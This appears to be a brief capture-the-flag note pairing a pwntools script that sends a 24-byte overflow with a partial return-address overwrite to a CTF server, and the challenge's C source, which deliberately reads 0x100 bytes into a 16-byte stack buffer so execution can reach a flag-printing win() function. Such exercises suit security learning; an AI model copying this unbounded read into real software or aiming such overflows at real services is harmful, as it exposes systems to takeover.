## C1: 
```js
from pwn import *
io = remote('warmup1.ctf.maplebacon.org', 1337)
io.send(b'A' * 24 + b'\x19');
```
## C2: 

```js 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[0x10];
    read(0, buf, 0x100);
}

int main() {
    alarm(60);
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    vuln();

    return 0;
}

void win() {
    execl("/bin/cat", "/bin/cat", "flag.txt", NULL);
}

```

